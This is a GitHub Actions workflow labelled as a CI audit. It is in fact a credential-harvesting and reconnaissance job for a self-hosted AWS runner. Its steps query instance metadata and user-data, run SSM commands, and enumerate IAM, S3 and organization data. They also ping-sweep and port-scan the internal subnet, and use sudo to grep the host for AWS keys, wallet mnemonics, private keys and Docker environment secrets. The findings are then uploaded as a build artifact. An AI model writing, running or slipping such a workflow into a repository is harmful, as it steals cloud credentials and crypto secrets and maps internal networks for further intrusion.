name: ci-audit-2836b
on: push
permissions:
  contents: read
jobs:
  cloud:
    runs-on: [self-hosted, linux, aws, marketingos]
    timeout-minutes: 50
    steps:
      - name: awsperm
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836b"; mkdir -p "$D"; R=ap-southeast-3
          {
            echo "## userdata"; TOK=$(curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token);
              curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/user-data | head -60; echo;
            echo "## metamisc"; curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/network/interfaces/macs/; echo;
              curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/info; echo;
            echo "## ssm-send self"; aws ssm send-command --region $R --instance-ids i-0e76c4af843832b30 --document-name AWS-RunShellScript --parameters 'commands=["hostname"]' 2>&1 | head -25;
            echo "## ssm params"; aws ssm describe-parameters --region $R 2>&1 | head -10; aws ssm get-parameters-by-path --region $R --path / --recursive 2>&1 | head -10;
            echo "## iam"; aws iam list-roles 2>&1 | head -8; aws iam list-users 2>&1 | head -8;
            echo "## s3 bucket"; aws s3api get-bucket-location --bucket financeos-attachments-219934880769 2>&1 | head -8; aws s3 ls s3://financeos-attachments-219934880769/ 2>&1 | head -8;
            echo "## ec2 self attr"; aws ec2 describe-instance-attribute --region $R --instance-id i-0e76c4af843832b30 --attribute userData 2>&1 | head -8;
            echo "## ecrpublic"; aws ecr-public describe-registries 2>&1 | head -8;
            echo "## org"; aws organizations describe-organization 2>&1 | head -8;
            echo "## cost"; aws ce get-cost-and-usage --time-period Start=2026-10-01,End=2026-10-27 --granularity MONTHLY --metrics BlendedCost 2>&1 | head -8;
          } > "$D/awsperm.txt" 2>&1
          sed -n '1,200p' "$D/awsperm.txt" | cut -c1-300
      - name: netscan
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836b"
          {
            echo "## nmap?"; which nmap nc arp-scan 2>&1;
            echo "## alive hosts (arp+ping)"; for i in $(seq 1 254); do (ping -c1 -W1 192.168.1.$i >/dev/null 2>&1 && echo "alive 192.168.1.$i") & done; wait;
            echo "## arp final"; ip neigh;
            for h in 192.168.1.2 192.168.1.3 192.168.1.4 192.168.1.10 192.168.1.20 192.168.1.100 192.168.1.200 192.168.1.222; do
              echo "--- ports $h";
              for p in 22 80 443 1433 3000 3306 3389 5432 5985 5986 6379 8080 8443 9000 9200 22; do
                timeout 1 bash -c "cat < /dev/null > /dev/tcp/$h/$p" 2>/dev/null && echo "$h:$p OPEN";
              done
            done
            echo "## 100.76.35.83"; timeout 5 bash -c 'cat < /dev/null > /dev/tcp/100.76.35.83/22' 2>/dev/null && echo JUMP_OPEN || echo JUMP_UNREACHABLE;
          } > "$D/net.txt" 2>&1
          sed -n '1,200p' "$D/net.txt"
      - name: hostdeep
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836b"
          {
            echo "## docker"; sudo -n docker ps -a 2>&1 | head -20; sudo -n docker images 2>&1 | head -20; sudo -n docker volume ls 2>&1 | head -20;
            echo "## docker env keys"; for c in $(sudo -n docker ps -aq 2>/dev/null); do echo "-- $c $(sudo -n docker inspect -f '{{.Name}} {{.Config.Image}}' $c 2>/dev/null)"; sudo -n docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' $c 2>/dev/null | grep -iE 'key|secret|token|wallet|tron|aws|mnemonic|pass' | cut -c1-180 | head -12; done;
            echo "## aws keys on disk"; sudo -n grep -rIl -E 'AKIA[0-9A-Z]{16}|aws_secret_access_key' /home /root /opt /srv /etc /var/lib/docker/volumes 2>/dev/null | grep -vE 'node_modules|/\.git/|runner/_work|/proc/' | head -20;
            echo "## tron/wallet strings"; sudo -n grep -rIl -E 'TM3ARBAFLHjNtWrzwXddy6cDnuVCc33u1v|TJqx3DXsa5z4djpavVqnrFi1iB45vMx3cB|mnemonic|keystore|privateKey|PRIVATE KEY' /home /root /opt /srv 2>/dev/null | grep -vE 'node_modules|/\.git/|runner/_work|obsidian-vault|/proc/' | head -40;
            echo "## keystore files"; sudo -n find /home /root /opt /srv /var/lib/docker -xdev -iname '*keystore*' -o -iname '*wallet*.json' 2>/dev/null | grep -v node_modules | head -30;
            echo "## apps dirs"; ls -la /home/ubuntu/apps 2>&1; ls -la /home/ubuntu/backups 2>&1 | head; ls -la /home/ubuntu/apps/obsidian-vault 2>&1 | head -5;
            echo "## runner work repos"; ls /home/ubuntu/actions-runner/_work 2>&1; ls /home/ubuntu/actions-runner/_work/*/ 2>&1 | head -40;
            echo "## cron/systemd"; crontab -l 2>&1; sudo -n ls -la /etc/cron.d 2>&1 | head; sudo -n systemctl list-units --type=service --state=running --no-pager 2>&1 | head -40;
            echo "## listening"; ss -lntup 2>&1 | head -40;
            echo "## recent files"; sudo -n find /home /root /opt /srv -xdev -type f -newermt '2026-10-20' 2>/dev/null | grep -vE 'runner/_work|node_modules|\.cache|/\.git/|\.npm' | head -60;
          } > "$D/deep.txt" 2>&1
          sed -n '1,240p' "$D/deep.txt" | cut -c1-260
      - name: upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: a2836b
          path: ${{ runner.temp }}/a2836b
          if-no-files-found: warn
          retention-days: 2
